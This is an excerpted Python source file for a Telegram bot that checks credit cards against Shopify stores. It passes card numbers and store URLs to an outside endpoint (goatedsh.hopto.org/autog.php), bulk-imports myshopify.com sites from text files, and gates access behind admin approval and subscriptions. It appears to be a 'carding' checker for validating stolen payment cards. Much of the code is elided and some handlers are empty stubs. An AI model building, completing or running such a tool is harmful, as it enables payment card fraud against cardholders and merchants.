...
def request_approval(message):
    """Request admin approval for user"""
    user_id = message.from_user.id
...
def handle_admin(message):
    ...
    bot.reply_to(message,
        "🛠 *Admin Panel*\n\n"
        "Total Users: " + str(len(USER_SITES)) + "\n"
        "Approved Users: " + str(len(APPROVED_USERS)) + "\n"
        "Pending Approvals: " + str(len(PENDING_APPROVAL)) + "\n"
        "Banned Users: " + str(len(BANNED_USERS)) + "\n\n"
        "Select an option:",
        parse_mode='Markdown',
        reply_markup=markup
    )
...
# Performance optimized test_shopify_site with caching
def test_shopify_site(url):
    ...
    try:
        ...
        api_url = f"http://goatedsh.hopto.org/autog.php?cc={cc}&site={site}"
        ...
        result = (False, f"Error testing site: {str(e)}", "0.0", "shopify_payments", "Error")
        SITE_CACHE[cache_key] = (result, current_time)
        return result
...
# Performance optimized check_shopify_cc
def check_shopify_cc(cc, site_info):
    """Check credit card on Shopify site with performance optimizations"""
    try:
        ...
        # Extract price and gateway if present
...
# Stylish result formatting functions
...
# Shopify sites auto-detection from .txt file
def extract_shopify_sites_from_file(file_content):
    """Extract Shopify sites from text file content"""
    shopify_sites = []
    lines = file_content.decode('utf-8').splitlines()
    
    # Patterns to detect Shopify sites
    shopify_patterns = [
        r'https?://(?:www\.)?[a-zA-Z0-9][a-zA-Z0-9-]*\.myshopify\.com[/]?',
    ...
    for line in lines:
        ...
        try:
            ...
            if '.myshopify.com' in line.lower():
...
# Bulk add Shopify sites from file
@bot.message_handler(commands=['bulkadd'])
@flood_control
def handle_bulkadd(message):
    """Add Shopify sites from .txt file"""
    ...
    try:
        ...
        status_msg = bot.reply_to(message, "📁 Processing file... Extracting Shopify sites...")
        ...
        if not shopify_sites:
            bot.edit_message_text(
                ...
                text="❌ No Shopify sites found in the file. Please make sure the file contains valid Shopify URLs."
            )
            return
        ...
        for i, url in enumerate(shopify_sites):
            # Update progress
            if i % 5 == 0 or i == len(shopify_sites) - 1:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    text=f"✅ Found {len(shopify_sites)} potential Shopify sites.\n\n"
                         ...
                         f"Added: {added_count} | Failed: {failed_count} | Already exists: {already_exists_count}"
                )
        ...
        bot.edit_message_text(
            ...
            message_id=status_msg.message_id,
            text=f"""
✅ <b>Bulk Add Completed!</b>

📊 <b>Results:</b>
├⦿ Sites found in file: {len(shopify_sites)}
├⦿ Successfully added: {added_count}
├⦿ Failed to add: {failed_count}
├⦿ Already existed: {already_exists_count}
└⦿ Total sites now: {len(USER_SITES[user_id])}

🔄 Use <code>/myurl</code> to view all your sites
🔧 Use <code>/clean</code> to remove non-working sites
            """,
            parse_mode='HTML'
        )
...
# Update the require_approval decorator
def require_approval(func):
    def wrapper(message, *args, **kwargs):
        ...
        if message.chat.type == 'private' and user_id not in APPROVED_USERS:
            if user_id in PENDING_APPROVAL:
                bot.reply_to(message, "⏳ Your request is pending admin approval. Please wait.")
            else:
                request_approval(message)
        ...
        # Check subscription for private chats
        if message.chat.type == 'private' and user_id not in SUBSCRIBED_USERS:
            check_subscription(message)
            return
...
# Update all command handlers with require_approval decorator
...
# Update other handlers to include the decorator
@bot.message_handler(commands=['maddurl', 'myurl', 'rmurl', 'rmall', 'clean', 'fl', 'mass', 'startchk', 'msh'])
@require_approval
@flood_control
def handle_other_commands(message):
    # These handlers remain the same as in your original code
    # Just adding the @require_approval decorator
    pass
...
if __name__ == "__main__":
    ...
    print(" Bulk Shopify site adding from .txt files")
    print(" Auto-detection of Shopify sites")
